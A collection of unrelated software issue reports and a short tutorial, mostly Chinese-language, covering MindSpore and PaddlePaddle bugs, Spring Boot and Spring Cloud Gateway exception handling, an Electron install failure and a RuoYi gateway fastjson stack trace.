np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 96.94 13.79 -29.98] E data_me_error:[ 97.06 13.805 -30.02 ] E loss:[0.125 0.01563 0.03125]"
2.0.5 版本下 返回文件不能识别，附详细介绍,项目背景： 复现操作： 在标准接口文档中，因为是抽象出来的统一excel 上传接口 返回json 对象字符串 受springboot 版本限制不能升级更高版本测试   <code>: &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.8.RELEASE&lt;/version&gt; &lt;relativePath /&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;!--在引用时请在maven中央仓库搜索2.X最新版本号--&gt; &lt;version&gt;2.0.5&lt;/version&gt; &lt;/dependency&gt;
[CT][MS][GPU_TrilIndices]api description has some issue,"TrilIndices API 描述有些问题 / 硬件环境: /device /GPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph API 描述检查 检查API描述 API描述正确， 完整， 清晰 1.属性dtype， 没有说明其含义（输出dtype）， 值描述错误， 应该是mindspore.int32, mindspore.int64 2.输出没有说明dtype, 以及建议给出shape计算公式 3.TypeError: If is neither int32 not int64.， not-&gt;nor 4.支持平台写错， 目前只支持GPU   <code>: dtype Args: row (int): number of rows in the 2-D matrix. col (int): number of columns in the 2-D matrix. offset (int): diagonal offset from the main diagonal. Default: 0. dtype (:class:`mindspore.dtype`): An optional data type of `mindspore.dtype.int32` and `mindspore.dtype.int64`. Default: `mindspore.dtype.int32`. Outputs: - **y** (Tensor) - indices of the elements in lower triangular part of matrix. Raises: TypeError: If `row`, `col` or `offset` is not an int. TypeError: If `dtype` is neither int32 not int64. ValueError: If `row` or `col` &lt; 0. Supported Platforms: ``Ascend`` ``GPU`` ``CPU``"
Resolve] Unresolved symbol: grad_ . Error in GRAPH_MODE,"Resolve] Unresolved symbol: grad_   <code>: from mindspore.nn import TrainOneStepCell import mindspore.nn as nn import mindspore import numpy as np import mindspore.dataset as ds from mindspore.nn import Adam from mindspore import Model from mindspore import ops from mindspore.train.callback import LossMonitor from mindspore.ops import constexpr @constexpr def generate_tensor(batch_size): np_array = np.random.randn(batch_size, 1,1,1) return mindspore.Tensor(np_array,mindspore.float32) class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.dense = nn.Dense(3*4*4, 1)#768 def construct(self,x,get_Feature): x = mindspore.ops.reshape(x,(2,-1)) x = self.dense(x) return x class GradientWithInput(nn.Cell): def __init__(self,discrimator): super(GradientWithInput, self).__init__() self.reduce_sum = ops.ReduceSum() self.discrimator = discrimator def construct(self,interpolates): decisionInterpolate = self.discrimator(interpolates, False) decisionInterpolate = self.reduce_sum(decisionInterpolate,0) return decisionInterpolate class WGANGPGradientPenalty(nn.Cell): def __init__(self,discrimator,lambdaGP=10): super(WGANGPGradientPenalty,self).__init__() self.gradient_op = ops.GradOperation() self.reduce_sum = ops.ReduceSum() self.reduce_sum_keep_dim = ops.ReduceSum(keep_dims=True) self.sqrt = ops.Sqrt() self.discrimator = discrimator self.gradientWithInput = GradientWithInput(discrimator) self.lambdaGP = mindspore.Tensor(lambdaGP,mindspore.float32) self.gradient_function = self.gradient_op(self.gradientWithInput) def construct(self,input,fake): batch_size = input.shape[0] alpha =generate_tensor(batch_size) alpha = alpha.expand_as(input) interpolates = alpha * input + ((1 - alpha) * fake) gradient = self.gradient_function(interpolates) gradient = ops.reshape(gradient,(batch_size,-1)) gradient = self.sqrt(self.reduce_sum(gradient*gradient,1)) gradient_penalty = self.reduce_sum_keep_dim((gradient - 1.0)**2) * self.lambdaGP return gradient_penalty np_array = np.random.randn(2,3,4,4) real_image = mindspore.Tensor(np_array,mindspore.float32) np_array = np.random.randn(2,3,4,4) fake_image = mindspore.Tensor(np_array,mindspore.float32) mindspore.context.set_context(mode=mindspore.context.GRAPH_MODE,device_target=""Ascend"",device_id=6) net = Net() net_loss = WGANGPGradientPenalty(net) opti = Adam(filter(lambda x:x.requires_grad,net.get_parameters()),0.01) train_network = TrainOneStepCell(net_loss,opti) for i in range(5): train_network.set_train() loss = train_network(real_image,fake_image) print(loss)"
[ST][NET][efficientnet][gpu]Exec export script failed,efficientnet网络在GPU环境执行export脚本失败 / 硬件环境: /device GPU : -- MindSpore version :r1.9 commit_id:90b3153080 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220914 MindSpore 版本：编译时间20220917123349 r1.9.0 commit_id:90b3153080 (/): /mode graph test_ms_efficientnet_gpu_imagenet_export_mindir.py cd solution_test/remaining/test_scripts/mindspore/net/efficientnet_GPU python -m nose -s --nologcapture test_ms_efficientnet_gpu_imagenet_export_mindir.py export mindir成功 走给安正气   <code>: usage: export.py [-h] [--config_path CONFIG_PATH] [--dataset DATASET] [--data_path DATA_PATH] [--platform PLATFORM] [--distributed DISTRIBUTED] [--resume RESUME] [--checkpoint CHECKPOINT] [--random_seed RANDOM_SEED] [--resize_value RESIZE_VALUE] [--model MODEL] [--drop DROP] [--drop_connect DROP_CONNECT] [--opt_eps OPT_EPS] [--lr LR] [--batch_size BATCH_SIZE] [--decay_epochs DECAY_EPOCHS] [--warmup_epochs WARMUP_EPOCHS] [--decay_rate DECAY_RATE] [--weight_decay WEIGHT_DECAY] [--epochs EPOCHS] [--workers WORKERS] [--amp_level AMP_LEVEL] [--opt OPT] [--num_classes NUM_CLASSES] [--gp GP] [--momentum MOMENTUM] [--warmup_lr_init WARMUP_LR_INIT] [--smoothing SMOOTHING] [--bn_tf BN_TF] [--save_checkpoint SAVE_CHECKPOINT] [--keep_checkpoint_max KEEP_CHECKPOINT_MAX] [--loss_scale LOSS_SCALE] [--resume_start_epoch RESUME_START_EPOCH] export.py: error: unrecognized arguments: --ckpt_file=/home/workspace/mindspore_ckpt/efficientnet/efficientnet_b0-gpu_600_1251.ckpt --file_name=efficientnet_b0_gpu --file_format=MINDIR --device_target=GPU {}
按照提示安装失败,"以前独立安装过electron，现在按照官网步骤安装，报错： Downloading electron-v12.0.17-win32-x64.zip: [=================================================] 100% ETA: 0.0 seconds RequestError: read ECONNRESET at ClientRequest. (E:\git\electron-egg\node_modules\got\source\request-as-event-emitter.js:178:14) at Object.onceWrapper (events.js:520:26) at ClientRequest.emit (events.js:412:35) at ClientRequest.origin.emit (E:\git\electron-egg\node_modules@szmarczak\http-timer\source\index.js:37:11) at TLSSocket.socketErrorListener (_http_client.js:475:9) at TLSSocket.emit (events.js:400:28) at emitErrorNT (internal/streams/destroy.js:106:8) at emitErrorCloseNT (internal/streams/destroy.js:74:3) at processTicksAndRejections (internal/process/task_queues.js:82:21) npm WARN ws@7.4.6 requires a peer of bufferutil@^4.0.1 but none is installed. You must install peer dependencies yourself. npm WARN ws@7.4.6 requires a peer of utf-8-validate@^5.0.2 but none is installed. You must install peer dependencies yourself. npm WARN co-mocha@1.2.2 requires a peer of mocha@&gt;=1.18 &lt;6 but none is installed. You must install peer dependencies yourself. npm WARN acorn-jsx@5.3.2 requires a peer of acorn@^6.0.0 || ^7.0.0 || ^8.0.0 but none is installed. You must install peer dependencies yourself. npm WARN electron-egg@1.13.0 license should be a valid SPDX license expression npm WARN optional SKIPPING OPTIONAL DEPENDENCY: dmg-license@1.0.9 (node_modules\dmg-license): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for dmg-license@1.0.9: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.3.2 (node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@2.3.2: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm ERR! code ELIFECYCLE npm ERR! errno 1 npm ERR! electron@12.0.17 postinstall: npm ERR! Exit status 1 npm ERR! npm ERR! Failed at the electron@12.0.17 postinstall script. npm ERR! This is probably not a problem with npm. There is likely additional logging output above. npm ERR! A complete log of this run can be found in: npm ERR! D:\Program Files\nodejs\node_modules\node_cache_logs\2021-08-27T06_29_25_074Z-debug.log   <code>: node install.js"
Spring Cloud Gateway 全局通用异常处理,"为什么需要全局异常处理 在传统 Spring Boot 应用中， 我们 @ControllerAdvice 来处理全局的异常，进行统一包装返回 例如： ③ 处应用调用数据库异常，通过 @ControllerAdvice 包装异常请求响应给客户端 重写 ErrorWebExceptionHandler   <code>: // 摘至 spring cloud alibaba console 模块处理 @ControllerAdvice public class ConsoleExceptionHandler { @ExceptionHandler(AccessException.class) private ResponseEntity&lt;String&gt; handleAccessException(AccessException e) { return ResponseEntity.status(HttpStatus.FORBIDDEN).body(e.getErrMsg()); } } public class ExceptionHandlingWebHandler extends WebHandlerDecorator { @Override public Mono&lt;Void&gt; handle(ServerWebExchange exchange) { Mono&lt;Void&gt; completion; try { completion = super.handle(exchange); } catch (Throwable ex) { completion = Mono.error(ex); } // 获取全局的 WebExceptionHandler 执行 for (WebExceptionHandler handler : this.exceptionHandlers) { completion = completion.onErrorResume(ex -&gt; handler.handle(exchange, ex)); } return completion; } } public class DefaultErrorWebExceptionHandler { @Override protected RouterFunction&lt;ServerResponse&gt; getRoutingFunction(ErrorAttributes errorAttributes) { // 根据客户端 `accpet` 请求头决定返回什么资源，如上浏览器返回的是 页面 return route(acceptsTextHtml(), this::renderErrorView).andRoute(all(), this::renderErrorResponse); } } // 模拟指定 `accpet` 情况 curl --location --request GET 'http://localhost:9999/adminx/xx' \ 18:09:23 --header 'Accept: application/json' {""timestamp"":""2020-05-24 18:09:24"",""path"":""/adminx/xx"",""status"":404,""error"":""Not Found"",""message"":null,""requestId"":""083c48e3-2""}? /** * @author lengleng * @date 2020/5/23 * &lt;p&gt; * 网关异常通用处理器，只作用在webflux 环境下 , 优先级低于 {@link ResponseStatusExceptionHandler} 执行 */ @Slf4j @Order(-1) @RequiredArgsConstructor public class GlobalExceptionConfiguration implements ErrorWebExceptionHandler { private final ObjectMapper objectMapper; @Override public Mono&lt;Void&gt; handle(ServerWebExchange exchange, Throwable ex) { ServerHttpResponse response = exchange.getResponse(); if (response.isCommitted()) { return Mono.error(ex); } // header set response.getHeaders().setContentType(MediaType.APPLICATION_JSON); if (ex instanceof ResponseStatusException) { response.setStatusCode(((ResponseStatusException) ex).getStatus()); } return response .writeWith(Mono.fromSupplier(() -&gt; { DataBufferFactory bufferFactory = response.bufferFactory(); try { return bufferFactory.wrap(objectMapper.writeValueAsBytes(R.failed(ex.getMessage()))); } catch (JsonProcessingException e) { log.warn(""Error writing response"", ex); return bufferFactory.wrap(new byte[0]); } })); } }"
 [功能] 支持 `Sql` 高级代理切换数据库上下文定位器,目前版本只能通过 方式在特定方法上切换，无法在接口中全局设置，也无法动态设置。所以： [移除] 方式 [新增] 方式，支持接口和方法设置，优先级为： [新增] 动态切换接口方法 相关 Issue ：#I3XDCR:Sql 高级代理——接口名称上加添加定位器（interface ISql&lt;TDbContextLocator&gt; : ISqlDispatchProxy）   <code>: [SqlXXXX(DbContextLocator = typeof(定位器))] SqlXXX(DbContextLocator = typeof(定位器)) [SqlDbContextLocator(typeof(定位器))] 方法 &gt; 接口 .Change&lt;定位器&gt;()
Bad performance of ColwiseAdd in CPU,"Through flamegraph, has bad performance.   <code>: ColwiseAdd"
Variable closure should be supported by GO_OP,"@reyoung While we were implementing the GO_OP, we realized that we may need to provide block captures (ie: closures) for scope variables. Please see below for details... Intro Fluids allows variables to exists within scopes. Variables can be persistable (exists in global scope) or non-persistable . When a sub block is added to the main block, a new child local scope is created from the parent scope. The sub block is able to access variables from within its local and parent scopes. This works well for a single threaded case (since the parent blocks will never exit before the child blocks), however we run into problems when we introduce a multi-threaded scenario with the GO_OP. GO_OP creates a new block, operators and local variables. It then executes the block in a new thread. Since the block executes asynchronously from the parent block, the parent block could potentially have exited while the GO_OP is executing. In our current architecture, when the parent block exits, it deletes it's local scope, any child scopes, and any local variables that in that local scope. If the GO_OP creates a local scope from the parent block's local scope, then this will cause an issue when the GO_OP operators tries to access any parent scope variables. Take the example below: Before the fluid.Go() operator is ran, the scopes looks like this: https://gist.github.com/cs2be/50dd2540f1a43445e74ff0f5f1dc8097 Please let us know if this design would work, or if you see any potential issues. Thanks.   <code>: cond = layers.less_than(x=a0, y=a1) ie = layers.IfElse(cond) with ie.true_block(): a0 = layers.data(name='a0', shape=[1], dtype='int64') a1 = layers.data(name='a1', shape=[1], dtype='int64') with fluid.Go(): # This will cause an error. a0/a1 exists in the ie.true_block local scope. # When fluid.Go() executes, ie.true_block may have already exited a_sum = layers.sums(input=[mean_a0, mean_a1])"
"[网关异常处理]请求路径:/auth/login,异常信息:write javaBean error, fastjson version 1.2.73","登录时报以下异常，对ruoyi-gateway-2.1.0.jar解压后发现其springfox-swagger-ui-2.9.2.jar的包是存在的，本地直接运行jar包或者docker容器运行都会有此问题。   <code>: 2020-09-13 11:13:58.539 ERROR 4076 --- [ctor-http-nio-6] c.r.g.handler.GatewayExceptionHandler : [网关异常处理]请求路径:/auth/login,异常信息:write javaBean error, fastjson version 1.2.73, class org.springframework.boot.web.reactive.context.AnnotationConfigReactiveWebServerApplicationContext, fieldName : applicationContext, class path resource [META-INF/resources/webjars/] cannot be resolved to absolute file path because it does not reside in the file system: jar:file:/D:/docker-data/RuoYi-Cloud/ruoyi-gateway/target/ruoyi-gateway-2.1.0.jar!/BOOT-INF/lib/springfox-swagger-ui-2.9.2.jar!/META-INF/resources/webjars/ com.alibaba.fastjson.JSONException: write javaBean error, fastjson version 1.2.73, class org.springframework.boot.web.reactive.context.AnnotationConfigReactiveWebServerApplicationContext, fieldName : applicationContext, class path resource [META-INF/resources/webjars/] cannot be resolved to absolute file path because it does not reside in the file system: jar:file:/D:/docker-data/RuoYi-Cloud/ruoyi-gateway/target/ruoyi-gateway-2.1.0.jar!/BOOT-INF/lib/springfox-swagger-ui-2.9.2.jar!/META-INF/resources/webjars/ at com.alibaba.fastjson.serializer.JavaBeanSerializer.write(JavaBeanSerializer.java:539) ~[fastjson-1.2.73.jar!/:na] Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: Error has been observed at the following site(s): |_ checkpoint ? org.springframework.cloud.gateway.filter.WeightCalculatorWebFilter [DefaultWebFilterChain] |_ checkpoint ? org.springframework.boot.actuate.metrics.web.reactive.server.MetricsWebFilter [DefaultWebFilterChain] |_ checkpoint ? HTTP POST ""/auth/login"" [ExceptionHandlingWebHandler] Stack trace: at com.alibaba.fastjson.serializer.JavaBeanSerializer.write(JavaBeanSerializer.java:539) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JavaBeanSerializer.write(JavaBeanSerializer.java:149) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:360) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.ASMSerializer_2_DefaultServerWebExchange.write(Unknown Source) ~[na:na] at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:312) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:769) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:707) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:672) ~[fastjson-1.2.73.jar!/:na] at com.ruoyi.gateway.filter.AuthFilter.filter(AuthFilter.java:49) ~[classes!/:na] at org.springframework.cloud.gateway.handler.FilteringWebHandler$GatewayFilterAdapter.filter(FilteringWebHandler.java:138) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at org.springframework.cloud.gateway.filter.OrderedGatewayFilter.filter(OrderedGatewayFilter.java:44) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at org.springframework.cloud.gateway.handler.FilteringWebHandler$DefaultGatewayFilterChain.lambda$filter$0(FilteringWebHandler.java:118) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:44) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at com.alibaba.csp.sentinel.adapter.reactor.MonoSentinelOperator.subscribe(MonoSentinelOperator.java:40) ~[sentinel-reactor-adapter-1.7.1.jar!/:na] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:172) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:150) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoNext$NextSubscriber.onNext(MonoNext.java:76) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:851) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1712) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:144) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoNext$NextSubscriber.onNext(MonoNext.java:76) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:851) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxOnErrorResume$ResumeSubscriber.onNext(FluxOnErrorResume.java:73) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onNext(MonoPeekTerminal.java:173) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1712) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFilterWhen$MonoFilterWhenMain.onNext(MonoFilterWhen.java:140) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$ScalarSubscription.request(Operators.java:2274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFilterWhen$MonoFilterWhenMain.onSubscribe(MonoFilterWhen.java:103) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoJust.subscribe(MonoJust.java:54) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:441) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onNext(FluxConcatMap.java:243) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onNext(FluxDematerialize.java:91) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onNext(FluxDematerialize.java:38) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.slowPath(FluxIterable.java:267) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.request(FluxIterable.java:225) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.request(FluxDematerialize.java:120) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onSubscribe(FluxConcatMap.java:228) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onSubscribe(FluxDematerialize.java:70) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:161) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:86) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalFluxOperator.subscribe(InternalFluxOperator.java:53) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDefer.subscribe(FluxDefer.java:54) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:441) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onSubscribe(FluxConcatMap.java:211) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:161) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:86) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:172) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.netty.http.server.HttpServerHandle.onStateChange(HttpServerHandle.java:64) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.tcp.TcpServerBind$ChildObserver.onStateChange(TcpServerBind.java:228) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.http.server.HttpServerOperations.onInboundNext(HttpServerOperations.java:465) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.channel.ChannelOperationsHandler.channelRead(ChannelOperationsHandler.java:90) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at reactor.netty.http.server.HttpTrafficHandler.channelRead(HttpTrafficHandler.java:170) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:321) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:308) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:422) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at 